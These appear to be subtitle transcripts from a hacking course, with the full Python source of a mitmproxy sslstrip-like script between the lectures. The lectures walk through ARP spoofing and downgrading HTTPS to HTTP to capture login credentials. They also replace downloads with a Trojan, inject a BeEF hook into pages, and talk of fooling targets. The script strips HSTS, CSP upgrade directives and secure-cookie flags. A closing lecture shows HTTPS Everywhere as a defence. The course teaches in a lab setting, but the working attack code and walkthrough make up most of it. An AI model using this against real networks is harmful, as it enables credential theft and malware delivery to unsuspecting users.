The only problem is all the attacks that you've seen and that you can do using the methods that I showed

4
00:00:15,440 --> 00:00:22,880
you will only work against Http websites and will not work against Https websites.

5
00:00:23,600 --> 00:00:29,660
Now, most of the websites on the internet now use Https, so that's a real problem.

6
00:00:30,020 --> 00:00:37,100
When Https is used, all the flows that's transmitted will be encrypted using SSL.

7
00:00:37,520 --> 00:00:43,790
This means that we will not be able to read the flow and therefore we won't be able to modify it.

8
00:00:43,820 --> 00:00:49,430
So even if you are running man in the middle web or man in the middle proxy just to analyze the data,

9
00:00:49,460 --> 00:00:55,010
you'll see nothing is flowing through it because everything is getting encrypted and it just won't be

10
00:00:55,040 --> 00:00:57,050
able to understand what's happening.

11
00:00:57,530 --> 00:01:05,430
Now, I showed you before how to use SSL strip to downgrade Https connections to Http and that worked

12
00:01:05,430 --> 00:01:06,300
very well.

13
00:01:06,420 --> 00:01:14,790
The only problem is man in the middle proxy is a transparent proxy and SSL strip is a transparent proxy

14
00:01:14,790 --> 00:01:15,570
as well.

15
00:01:15,690 --> 00:01:19,680
Therefore, you can't use both of them at the same time.

16
00:01:20,010 --> 00:01:24,180
So you can't use SSL strip with man in the middle proxy.

17
00:01:24,780 --> 00:01:30,750
The only solution to this problem, which is actually a good solution, is to use a man in the middle

18
00:01:30,750 --> 00:01:34,680
proxy script that works just like SSL strip.

19
00:01:34,950 --> 00:01:40,350
So remember when I started talking about Man in the Middle Proxy, I said it's a very, very powerful

20
00:01:40,350 --> 00:01:46,350
tool that can be used to pretty much implement any attack you can think of, including implementing

21
00:01:46,350 --> 00:01:48,330
a tool like SSL strip.

22
00:01:48,690 --> 00:01:50,550
So this is what we're going to be doing.

23
00:01:50,550 --> 00:01:55,320
We're going to be using a script that will downgrade Https connections to Http.

24
00:01:55,530 --> 00:02:01,740
But that script is actually a man in the middle proxy script, similar to the one that we wrote ourselves

25
00:02:01,740 --> 00:02:04,530
before, just a little bit more complex.

26
00:02:04,860 --> 00:02:07,620
So let me show you how we can use it in this lecture.

27
00:02:07,620 --> 00:02:12,360
And in the next lecture, I'll show you how to use it with the other attacks that we did before.

28
00:02:13,520 --> 00:02:19,700
So first of all, the script is here on their GitHub repo and there's actually a number of example scripts

29
00:02:19,700 --> 00:02:24,470
here that you can use and you can use all of them using the method that I'm going to show you now.

30
00:02:24,470 --> 00:02:29,660
So you can think of this as an example of using complex man in the middle proxy scripts.

31
00:02:29,810 --> 00:02:35,720
Now I'm going to include the link of this page in the resources and the script that we are interested

32
00:02:35,720 --> 00:02:36,860
in is this one.

33
00:02:36,860 --> 00:02:39,170
It's called SSL Script.py.

34
00:02:39,590 --> 00:02:46,250
Now, this is not SSL strip, the same tool that we used, but it's an implementation of SSL strip.

35
00:02:46,250 --> 00:02:50,060
So as you can see here, it says it's an SSL strip like attack.

36
00:02:50,480 --> 00:02:54,650
Now, to get this, you can download it or you can just click on the raw here.

37
00:02:56,310 --> 00:03:00,480
And then select everything Ctrl C to copy.

38
00:03:00,900 --> 00:03:09,450
And then I'm going to go on Genie and create a new file and paste it here, Ctrl V So that's it.

39
00:03:09,450 --> 00:03:14,880
As you can see, it's definitely more complex than the script that we wrote in here, which was only

40
00:03:14,880 --> 00:03:21,570
a few lines, but this is all commented so you can see anything that's preceded with the hash sign,

41
00:03:21,570 --> 00:03:22,950
that means it's a comment.

42
00:03:22,950 --> 00:03:28,350
So you can actually try to go ahead and follow and see what they're doing and maybe learn something

43
00:03:28,350 --> 00:03:28,950
new.

44
00:03:29,280 --> 00:03:31,470
Now, because this is a very useful script.

45
00:03:31,470 --> 00:03:35,970
I'm going to save this in the same directory as Man in the Middle proxy.

46
00:03:36,000 --> 00:03:36,960
You don't have to do that.

47
00:03:36,960 --> 00:03:41,250
You can put it anywhere you want, but I'm just going to do that so that it's easier for us and we can

48
00:03:41,250 --> 00:03:42,720
use it multiple times.

49
00:03:43,200 --> 00:03:51,480
So I'm going to put this in Opt Man in the Middle proxy and we're just going to call it SSL Script.py.

50
00:03:54,970 --> 00:03:57,640
Gonna hit enter and that's it.

51
00:03:57,640 --> 00:03:58,600
Saved for us.

52
00:03:58,960 --> 00:04:04,000
Now, using this is going to be exactly the same as using our basic script.

53
00:04:04,420 --> 00:04:06,220
So let's have a look on that.

54
00:04:07,510 --> 00:04:09,550
I'm going to come to my terminal here.

55
00:04:10,330 --> 00:04:15,520
I'm going to do my ARP spoofing attack first, then I'm going to run.

56
00:04:15,520 --> 00:04:17,140
Man in the middle proxy.

57
00:04:19,140 --> 00:04:21,870
I'm going to do Dash S to select my script.

58
00:04:21,870 --> 00:04:25,260
And my script right now is in the same working directory.

59
00:04:25,260 --> 00:04:28,530
So all I have to do is just type in SSL script.py.

60
00:04:29,690 --> 00:04:33,140
Because we started in opt man in the middle proxy.

61
00:04:33,770 --> 00:04:40,730
Finally, I'll have to give the transparent argument to run man in the middle proxy as a transparent

62
00:04:40,730 --> 00:04:41,390
proxy.

63
00:04:41,390 --> 00:04:42,200
And that's it.

64
00:04:42,200 --> 00:04:47,660
That's running for me now and then I'm going to run the IP table rule that will redirect flows from

65
00:04:47,660 --> 00:04:53,360
port 80 to 8080 where man in the middle proxy is running, data is going to flow through man in the

66
00:04:53,360 --> 00:04:56,120
middle proxy using the SSL strip.

67
00:04:56,120 --> 00:05:00,380
All the Https connections should be downgraded to Http.

68
00:05:01,040 --> 00:05:04,160
So let's go to the Windows machine and test this.

69
00:05:04,700 --> 00:05:07,820
So I'm just going to go to hotmail.com as usual.

70
00:05:09,550 --> 00:05:16,150
And as you can see, we went to the Http version of the website, not the Https, and I'm just going

71
00:05:16,150 --> 00:05:18,700
to log in with a fake username and password.

72
00:05:21,450 --> 00:05:22,470
And put the password.

73
00:05:22,470 --> 00:05:24,450
One, two, three, four, five, six.

74
00:05:24,450 --> 00:05:24,690
Hit.

75
00:05:24,690 --> 00:05:25,500
Enter.

76
00:05:25,530 --> 00:05:27,810
Let's go to Carly and see if we capture that.

77
00:05:28,560 --> 00:05:31,740
And as you can see, this worked perfectly.

78
00:05:31,740 --> 00:05:38,550
The connection was downgraded to Http and we managed to get the username, which is Zaid at hotmail.com

79
00:05:38,550 --> 00:05:43,320
and then we got the password, which is one, two, three, four, five, six.

80
00:05:43,830 --> 00:05:49,290
Now we've actually done something like this before using the normal SSL strip tool.

81
00:05:49,290 --> 00:05:56,040
So I'm not doing this as an extra lecture, but I wanted to show you how to test the tool first and

82
00:05:56,040 --> 00:06:01,740
then in the next lecture we're going to be using this with all the attacks that we did before and we'll

83
00:06:01,740 --> 00:06:10,650
see how we can modify HTML code on https websites and replace downloads again on https websites.


━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

"""
This script implements an sslstrip-like attack based on mitmproxy.
https://moxie.org/software/sslstrip/
"""
import re
import urllib

# set of SSL/TLS capable hosts
secure_hosts = set()


def request(flow):
    flow.request.headers.pop('If-Modified-Since', None)
    flow.request.headers.pop('Cache-Control', None)

    # do not force https redirection
    flow.request.headers.pop('Upgrade-Insecure-Requests', None)

    # proxy connections to SSL-enabled hosts
    if flow.request.pretty_host in secure_hosts:
        flow.request.scheme = 'https'
        flow.request.port = 443

        # We need to update the request destination to whatever is specified in the host header:
        # Having no TLS Server Name Indication from the client and just an IP address as request.host
        # in transparent mode, TLS server name certificate validation would fail.
        flow.request.host = flow.request.pretty_host


def response(flow):
    flow.response.headers.pop('Strict-Transport-Security', None)
    flow.response.headers.pop('Public-Key-Pins', None)

    # strip links in response body
    flow.response.content = flow.response.content.replace(b'https://', b'http://')

    # strip meta tag upgrade-insecure-requests in response body
    csp_meta_tag_pattern = b'<meta.*http-equiv=["\']Content-Security-Policy[\'"].*upgrade-insecure-requests.*?>'
    flow.response.content = re.sub(csp_meta_tag_pattern, b'', flow.response.content, flags=re.IGNORECASE)

    # strip links in 'Location' header
    if flow.response.headers.get('Location', '').startswith('https://'):
        location = flow.response.headers['Location']
        hostname = urllib.parse.urlparse(location).hostname
        if hostname:
            secure_hosts.add(hostname)
        flow.response.headers['Location'] = location.replace('https://', 'http://', 1)

    # strip upgrade-insecure-requests in Content-Security-Policy header
    if re.search('upgrade-insecure-requests', flow.response.headers.get('Content-Security-Policy', ''), flags=re.IGNORECASE):
        csp = flow.response.headers['Content-Security-Policy']
        flow.response.headers['Content-Security-Policy'] = re.sub('upgrade-insecure-requests[;\s]*', '', csp, flags=re.IGNORECASE)

    # strip secure flag from 'Set-Cookie' headers
    cookies = flow.response.headers.get_all('Set-Cookie')
    cookies = [re.sub(r';\s*secure\s*', '', s) for s in cookies]
    flow.response.headers.set_all('Set-Cookie', cookies)


1
00:00:01,170 --> 00:00:09,390
All right, Now let's see how we can replace downloads and run our own custom script on https websites.

2
00:00:09,390 --> 00:00:15,060
Because like I said, without the SSL strip script, you won't be able to do that.

3
00:00:15,390 --> 00:00:19,140
So first of all, man in the middle proxy is not working right now.

4
00:00:19,170 --> 00:00:27,210
I just want to go to a website that uses Https and I'll show you how it looks before we try to replace

5
00:00:27,210 --> 00:00:28,230
its downloads.

6
00:00:28,500 --> 00:00:32,160
So the website we're going to is going to be called lab.com.

7
00:00:34,430 --> 00:00:37,730
This is just another archive manager like WinZip.

8
00:00:37,760 --> 00:00:41,210
And as you can see in here, it uses Https.

9
00:00:41,210 --> 00:00:45,620
So on the normal page, on the main page https is used.

10
00:00:45,860 --> 00:00:47,840
Also on the download link.

11
00:00:47,840 --> 00:00:54,680
So if you just hover over this and look at the link below or if you just right click this and copy link

12
00:00:54,950 --> 00:01:01,790
location and then maybe if you just paste it in here, you'll see that it is a Https link.

13
00:01:01,940 --> 00:01:06,560
So even the download links here in the pages are Https.

14
00:01:07,040 --> 00:01:13,940
So if you use this script on its own, the custom script that we made, it will just not work.

15
00:01:14,330 --> 00:01:21,800
Now let's go to Kali and first of all, we're going to do our ARP spoofing attack to redirect the flow

16
00:01:21,800 --> 00:01:23,600
of packets through our computer.

17
00:01:23,600 --> 00:01:25,100
Same attack that we've been running.

18
00:01:25,100 --> 00:01:26,750
So I'm not even going to talk about it.

19
00:01:27,200 --> 00:01:33,500
Then the next step, this is the one that's going to be different is you can see that we're running

20
00:01:33,500 --> 00:01:38,160
man in the middle dump and we're passing it the SSL strip script.

21
00:01:38,640 --> 00:01:45,120
And the cool thing about Man in the Middle proxy is that it allows you to use multiple scripts at the

22
00:01:45,120 --> 00:01:45,960
same time.

23
00:01:45,960 --> 00:01:52,650
So all we have to do is just do another dash s and give it our custom made script, the script that

24
00:01:52,650 --> 00:01:53,320
we made.

25
00:01:53,340 --> 00:01:57,690
So my script was stored in root basic.py.

26
00:01:58,870 --> 00:02:00,940
This script right here.

27
00:02:01,480 --> 00:02:08,860
Now, I've also modified this to look for X extension and just replace the file with a file called file

28
00:02:08,860 --> 00:02:09,580
dot x.

29
00:02:09,850 --> 00:02:11,730
Just for testing purposes.

30
00:02:11,740 --> 00:02:13,960
So we're not looking for PDF right now.

31
00:02:14,410 --> 00:02:15,820
Now going up.

32
00:02:15,850 --> 00:02:17,630
Let's just revise this command.

33
00:02:17,650 --> 00:02:21,190
All we're doing is we're using the same man in the middle dump command.

34
00:02:21,220 --> 00:02:30,340
We are passing it the SSL strip.py, which will downgrade https connections to Http and it'll actually

35
00:02:30,340 --> 00:02:33,880
replace https links to Http in the web page.

36
00:02:34,030 --> 00:02:41,740
Then we're also giving it our custom made script which will look for X files and replace them with my

37
00:02:41,740 --> 00:02:44,650
own Trojan or with my own evil file.

38
00:02:45,130 --> 00:02:49,480
Then we're telling Man in the middle proxy to run in the transparent mode.

39
00:02:49,960 --> 00:02:52,840
I'm going to hit enter and that's going to work.

40
00:02:52,840 --> 00:02:57,880
And then I don't need to run the IP table rule because I've already run it a few minutes ago.

41
00:02:58,210 --> 00:03:04,520
Now let's go to the Kali machine and I'm just going to delete my history first.

42
00:03:09,310 --> 00:03:16,330
And let's go first to WinZip and make sure this does not affect our the functionality on normal Http

43
00:03:16,330 --> 00:03:16,930
pages.

44
00:03:16,930 --> 00:03:18,940
So I'm going to win Xpcom.

45
00:03:20,980 --> 00:03:23,750
And this is what we tested the attack against first.

46
00:03:23,770 --> 00:03:29,170
It only uses Http, not Https and the download link is only Http.

47
00:03:29,200 --> 00:03:35,810
As you see at the bottom, I'm going to click on download and as you can see, I get my file dot exe.

48
00:03:35,920 --> 00:03:38,980
The evil file which is coming from my website.

49
00:03:39,520 --> 00:03:41,750
I'll just save this doesn't really matter.

50
00:03:41,770 --> 00:03:47,380
Now let's go and test this against the https websites because we've done this before.

51
00:03:47,410 --> 00:03:48,640
This is nothing new.

52
00:03:49,060 --> 00:03:51,340
So let's go back to our labs.com.

53
00:03:53,750 --> 00:03:59,120
And notice this web page right now loaded as Http, not Https.

54
00:03:59,120 --> 00:04:01,520
So we don't see the https at the start.

55
00:04:02,180 --> 00:04:06,920
I'm going to go on downloads and I'm going to download one of them.

56
00:04:07,730 --> 00:04:15,350
And as you can see right now, I'm getting my evil file instead of the actual winrar file.

57
00:04:15,650 --> 00:04:23,330
So again, this attack now is working against Https websites and you can use this now to replace downloads

58
00:04:23,330 --> 00:04:27,110
on all websites, whether they use Http or Https.

59
00:04:27,110 --> 00:04:33,020
And that way you'll be able to fool your target and get them to download the Trojan or a backdoor or

60
00:04:33,020 --> 00:04:35,780
a virus or a keylogger or whatever you want.

61
00:04:36,940 --> 00:04:44,560
Now this method will allow you to bypass Https and make any man in the middle proxy script work with

62
00:04:44,560 --> 00:04:49,390
Https websites regardless of what that script is supposed to do.

63
00:04:50,200 --> 00:04:54,700
So you can actually test this with the more advanced script that we made.

64
00:04:54,700 --> 00:05:00,370
You can test it with the Trojan Factory script that replaces multiple file types and rename them.

65
00:05:00,370 --> 00:05:07,660
It doesn't matter what your script does, just make sure that you use the SSL strip script with the

66
00:05:07,660 --> 00:05:11,830
script that you want to run the same way that I showed you in this video.



━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

1
00:00:00,200 --> 00:00:07,460
Now, the other thing that we did using man in the Middle proxy was replacing the body of the web page.

2
00:00:07,460 --> 00:00:11,870
So basically injecting a JavaScript or replacing any element of the body.

3
00:00:12,260 --> 00:00:20,740
Now, that will also not work if the web page uses Https, because like I said, the flow will be encrypted.

4
00:00:20,750 --> 00:00:30,260
But using this SSL strip script, we can downgrade the connection to Http and then modify the code of

5
00:00:30,260 --> 00:00:31,010
the page.

6
00:00:31,160 --> 00:00:33,150
So let's see how we do that as well.

7
00:00:33,170 --> 00:00:37,580
I'm going to go back to Kali and I'm just going to stop Man in the Middle proxy.

8
00:00:37,640 --> 00:00:38,420
I'll leave it there.

9
00:00:38,420 --> 00:00:39,320
Cap working.

10
00:00:40,590 --> 00:00:44,120
And let's have a look on the first command that we executed.

11
00:00:44,130 --> 00:00:46,350
So we are doing Man in the Middle proxy.

12
00:00:46,380 --> 00:00:52,530
We're passing it the SSL strip script to downgrade Https connections to Http and then we're running

13
00:00:52,530 --> 00:00:59,460
it in transparent mode now, leaving it the way it is, we can actually pass more arguments to it.

14
00:00:59,460 --> 00:01:05,490
So we can just use the replace argument exactly the same way that I showed you before.

15
00:01:05,820 --> 00:01:11,580
So I spent more than one lecture building the replace argument, and I'm just going to use the one that

16
00:01:11,580 --> 00:01:12,930
we built before.

17
00:01:12,930 --> 00:01:15,510
So I actually have it stored in here.

18
00:01:16,620 --> 00:01:22,200
And you can see I have the first one is the one that injects the simple alert script.

19
00:01:22,560 --> 00:01:26,550
And then the second one is the one that injects beef code.

20
00:01:26,970 --> 00:01:32,820
Now for testing, I usually test with the simplest case first, so I usually test with the alert first,

21
00:01:32,820 --> 00:01:35,240
and then if that works, I'd go with beef.

22
00:01:35,250 --> 00:01:40,170
But I've already tested this and I don't want to make the video too long on you, so I'm just going

23
00:01:40,170 --> 00:01:42,990
to test straight away with the beef code.

24
00:01:43,260 --> 00:01:48,840
And again, if you don't remember how I wrote this replace argument, please go back to the lecture

25
00:01:48,840 --> 00:01:53,580
where I showed you how to analyze the code and how to build this whole argument.

26
00:01:53,580 --> 00:01:56,220
I spent more than one lecture explaining this.

27
00:01:56,310 --> 00:02:04,140
So right now I'm just going to copy it and I'm going to go here and I'm going to paste it after my transparent

28
00:02:04,140 --> 00:02:04,890
argument.

29
00:02:05,430 --> 00:02:09,360
So the command looks long, but it's actually very, very simple.

30
00:02:09,360 --> 00:02:11,610
We're just using man in the middle dump.

31
00:02:11,640 --> 00:02:16,990
We're giving it the SSL strip script to downgrade Https connections to Http.

32
00:02:17,560 --> 00:02:23,470
We're running man in the middle dump in a transparent mode and then we're using the replace argument

33
00:02:23,470 --> 00:02:30,310
that's going to look for the slash body in the code and then it's going to replace that with this code

34
00:02:30,310 --> 00:02:34,870
right here, which will inject our beef hook and then it'll close the body.

35
00:02:35,320 --> 00:02:40,840
So we run this exactly the same before without the SSL strip.

36
00:02:40,840 --> 00:02:48,340
And the whole point of using this is if we don't use it on https websites, the code will be encrypted

37
00:02:48,340 --> 00:02:50,080
so we won't be able to read it.

38
00:02:50,080 --> 00:02:53,260
So we won't even be able to see the body tag.

39
00:02:53,620 --> 00:02:59,050
Therefore, when we use the SSL strip argument, everything is going to be downgraded to Http.

40
00:02:59,350 --> 00:03:04,720
We'll be able to read the code, we'll be able to find the body tag and we'll be able to replace that

41
00:03:04,720 --> 00:03:05,920
with our script.

42
00:03:06,280 --> 00:03:10,000
So I'm going to hit Enter and that's working.

43
00:03:10,000 --> 00:03:10,450
Now.

44
00:03:10,450 --> 00:03:15,940
I've already run beef before and I'm just going to go to it here to show you that I don't have any online

45
00:03:15,940 --> 00:03:16,920
browsers.

46
00:03:16,920 --> 00:03:19,470
Okay, So you can see I've got nothing here.

47
00:03:19,560 --> 00:03:26,520
And now I'm going to go to the Windows machine and I'm just going to go back to hotmail.com.

48
00:03:29,210 --> 00:03:35,000
Now, in the basic case, this should not work because we should not be able to inject JavaScript code

49
00:03:35,000 --> 00:03:36,830
in Https websites.

50
00:03:37,670 --> 00:03:43,850
But because we're using the SSL strip script for man in the Middle proxy, the code should have been

51
00:03:43,850 --> 00:03:45,680
injected in this page by now.

52
00:03:45,680 --> 00:03:53,570
So if I go to beef, you can see I have my target as an online browser here, so I can click on it,

53
00:03:54,050 --> 00:04:00,830
I can go on the commands and I can run all the commands that beef allows me to do.

54
00:04:00,830 --> 00:04:07,010
And you should know by now how powerful beef is and how you can use it to do so many things and fool

55
00:04:07,010 --> 00:04:12,560
your target and hack into their computer or steal passwords from them or do so many cool stuff.

56
00:04:13,130 --> 00:04:16,270
Now, just as a test, I'm going to do something very basic.

57
00:04:16,280 --> 00:04:23,180
I'm just going to look for an alert and run an alert dialog to make sure that the JavaScript code can

58
00:04:23,180 --> 00:04:25,340
run properly on the target page.

59
00:04:25,700 --> 00:04:33,530
So this command right here will only just show an alert saying beef alert dialog, I'm going to execute

60
00:04:33,530 --> 00:04:34,220
this.

61
00:04:35,070 --> 00:04:37,110
And go to the target machine.

62
00:04:37,110 --> 00:04:43,830
And as you can see, the code is being executed on the target page, even though this page is supposed

63
00:04:43,830 --> 00:04:50,850
to use Https, we managed to hook it to beef and we managed to get beef to work and execute its commands.

64
00:04:51,210 --> 00:04:52,080
So that's it.

65
00:04:52,080 --> 00:04:53,760
That's the whole point of this lecture.

66
00:04:53,760 --> 00:05:01,770
I wanted to show you how you can run all the attacks that we did so far against Https pages because

67
00:05:01,770 --> 00:05:09,690
most of the internet runs on Https these days, so you can pass multiple scripts using the Dash s argument.

68
00:05:09,690 --> 00:05:15,660
Or you can just use man in the middle dump exactly the same way that you would use it with a Http page.

69
00:05:15,660 --> 00:05:21,090
Just make sure you tell man in the middle dump to use the SSL strip script.

70
00:05:22,010 --> 00:05:23,150
One more note.

71
00:05:23,180 --> 00:05:30,830
All of this will work against all Https websites except the ones that use Hsts.

72
00:05:30,830 --> 00:05:35,120
So the same applies for what applies for the normal SSL strip tool.

73
00:05:35,570 --> 00:05:44,390
Hsts websites are hard coded into the modern browsers, so the browser will simply just refuse to open

74
00:05:44,390 --> 00:05:46,820
that page with a plain http.

75
00:05:47,000 --> 00:05:52,580
So even if we use SSL strip, even if it works, the browser will literally just say, No, I'm not

76
00:05:52,580 --> 00:06:00,650
going to open this as Http because I am pre-programmed not to open pages like this as Http.

77
00:06:01,340 --> 00:06:08,450
So websites like Google, Facebook, Twitter and all these very famous websites use Https, but pretty

78
00:06:08,450 --> 00:06:16,340
much all other websites use plain Https, which can be downgraded to Http using this method.


━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

1
00:00:00,530 --> 00:00:07,910
So let's talk about how you can secure yourself or your networks from the Post connection attacks.

2
00:00:08,360 --> 00:00:16,400
Now, I showed you before how to detect these attacks using tools like sharp tools like that will tell

3
00:00:16,400 --> 00:00:22,760
you when someone is trying to run an ARP spoofing attack, but they will not protect you.

4
00:00:22,940 --> 00:00:29,780
So in this lecture, I want to show you a way of protecting yourself as a client, as a user from these

5
00:00:29,780 --> 00:00:31,070
type of attacks.

6
00:00:31,160 --> 00:00:36,260
To do that, we're going to use a tool called Https everywhere.

7
00:00:36,410 --> 00:00:40,340
Now, this is actually a plugin that you can install on your browser.

8
00:00:40,340 --> 00:00:43,040
So there is a version for Firefox and for Chrome.

9
00:00:43,040 --> 00:00:49,730
And what it does is it makes sure that Https is used on all websites.

10
00:00:49,730 --> 00:00:56,450
Even if you browse a website that uses Http, it will make sure that this website will only be loaded

11
00:00:56,450 --> 00:00:58,220
over Https.

12
00:00:58,310 --> 00:01:02,760
So Http websites will load over https.

13
00:01:02,790 --> 00:01:10,080
Https websites will always run on Https even if the target is using SSL strip.

14
00:01:11,210 --> 00:01:13,370
So I'll show you an example here.

15
00:01:13,400 --> 00:01:16,040
First of all, let's go ahead and download the tool.

16
00:01:16,040 --> 00:01:22,100
So on Google, just look for Https everywhere followed by the name of your browser.

17
00:01:22,100 --> 00:01:26,090
So if your browser is chrome, type in Https everywhere Chrome.

18
00:01:26,090 --> 00:01:30,950
My browser is Firefox, so I'm going to type in Https everywhere Firefox.

19
00:01:33,600 --> 00:01:37,330
And as you can see, the first result is the add on that I want to use.

20
00:01:37,350 --> 00:01:38,910
So I'm going to click on that.

21
00:01:41,180 --> 00:01:45,050
And then we're going to install this by clicking on add to Firefox.

22
00:01:45,080 --> 00:01:47,090
Doesn't get any simpler than this.

23
00:01:49,630 --> 00:01:51,730
Okay, now it's telling me, do I want to add this?

24
00:01:51,760 --> 00:01:53,980
It's going to access these information.

25
00:01:53,980 --> 00:01:56,200
I'm going to say yes, please add it for me.

26
00:01:56,200 --> 00:01:57,490
And that's it.

27
00:01:57,490 --> 00:01:59,500
Added and ready to use.

28
00:02:00,500 --> 00:02:04,590
Now, if you notice here on the top right, you'll see we have a new icon.

29
00:02:04,610 --> 00:02:08,580
This is the one for for https everywhere.

30
00:02:08,600 --> 00:02:14,060
So if we click on it, you'll see we can edit its configuration.

31
00:02:14,450 --> 00:02:18,680
So the first thing that you want to do is make sure that this is ticked in here.

32
00:02:18,680 --> 00:02:20,750
Enable https everywhere.

33
00:02:20,780 --> 00:02:24,560
Now, before I tick that, right now, the tool is disabled.

34
00:02:24,560 --> 00:02:30,980
And I want to show you that right now on the Kali machine, I'm running an ARP spoofing attack and I'm

35
00:02:30,980 --> 00:02:32,930
running SSL strip here on top.

36
00:02:32,930 --> 00:02:39,410
So if I'm going to go to a Https website like Hotmail, it will be downgraded to Http.

37
00:02:43,320 --> 00:02:45,810
And as you can see, it's loaded over Http.

38
00:02:46,170 --> 00:02:48,150
If I sign in real quick.

39
00:02:56,850 --> 00:03:01,140
You'll see in here I'll capture the username, which is Z dot hotmail.com.

40
00:03:01,140 --> 00:03:02,130
And the password.

41
00:03:02,160 --> 00:03:02,400
Test.

42
00:03:02,400 --> 00:03:03,030
Test.

43
00:03:03,210 --> 00:03:05,610
So our attack in here is working.

44
00:03:05,610 --> 00:03:06,600
And this hacker.

45
00:03:06,600 --> 00:03:12,930
And here is the man in the middle and is stripping https and downgrading it to Http.

46
00:03:13,140 --> 00:03:16,320
So their attack is successful and they can do that.

47
00:03:16,680 --> 00:03:20,640
Now if we go back here and I'm just going to close this tab.

48
00:03:21,790 --> 00:03:23,860
And enable Https everywhere.

49
00:03:23,860 --> 00:03:27,790
So I'm just going to click on its icon and tick this box to enable it.

50
00:03:29,380 --> 00:03:34,060
And then I'm just going to delete my history to make sure that we start from scratch.

51
00:03:35,400 --> 00:03:37,170
So I'm clearing everything here.

52
00:03:38,690 --> 00:03:41,270
And let's go to hotmail.com again.

53
00:03:44,500 --> 00:03:47,910
Now, as you can see, it's loading over Https.

54
00:03:47,920 --> 00:03:49,990
So if we go and log in.

55
00:03:52,450 --> 00:03:54,670
So we'll do Z two this time.

56
00:03:56,530 --> 00:03:57,580
And put a password.

57
00:03:57,580 --> 00:03:59,680
One, two, three, four, five, six.

58
00:03:59,710 --> 00:04:04,990
If we go back, you'll see we didn't capture anything in here.

59
00:04:05,700 --> 00:04:06,630
Now, let me show you.

60
00:04:06,630 --> 00:04:08,640
I'm also going to start Wireshark.

61
00:04:14,510 --> 00:04:15,950
And start sniffing.

62
00:04:19,250 --> 00:04:25,700
And I'm going to go to Windows and I'm actually just going to go to a normal Http website this time.

63
00:04:25,700 --> 00:04:27,350
So I'm going to go to Bing.com.

64
00:04:30,030 --> 00:04:35,130
And as you can see, even Bing.com is loading over Https.

65
00:04:35,130 --> 00:04:39,690
So we know Bing.com doesn't use Https and it usually loads over Http.

66
00:04:39,780 --> 00:04:46,290
But when you're using Https everywhere it's going to load it over https anyway.

67
00:04:47,110 --> 00:04:50,200
Now, if we search for anything, let's search for test.

68
00:04:51,190 --> 00:04:53,800
Everything is going through Https.

69
00:04:53,800 --> 00:04:59,970
So if we go back to Wireshark, you'll see all the information here is not useful.

70
00:04:59,980 --> 00:05:05,950
There is literally no URLs, no usernames, no passwords, even though I didn't log into anything.

71
00:05:05,950 --> 00:05:10,270
But you won't see them because as you can see, stuff is being sent over.

72
00:05:10,270 --> 00:05:18,250
TLS So everything is being encrypted, everything is being sent using Https, even if the website uses

73
00:05:18,250 --> 00:05:19,030
Http.

74
00:05:19,480 --> 00:05:26,590
So this method will actually protect you from ARP spoofing or man in the middle attacks, but it will

75
00:05:26,590 --> 00:05:27,640
not prevent it.

76
00:05:27,640 --> 00:05:30,190
So right now the hacker is the man in the middle.

77
00:05:30,190 --> 00:05:36,850
As you can see, the data is flowing through their computer, but the data isn't useful because it's

78
00:05:36,850 --> 00:05:39,130
encrypted using SSL.


━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━


==================================================================================
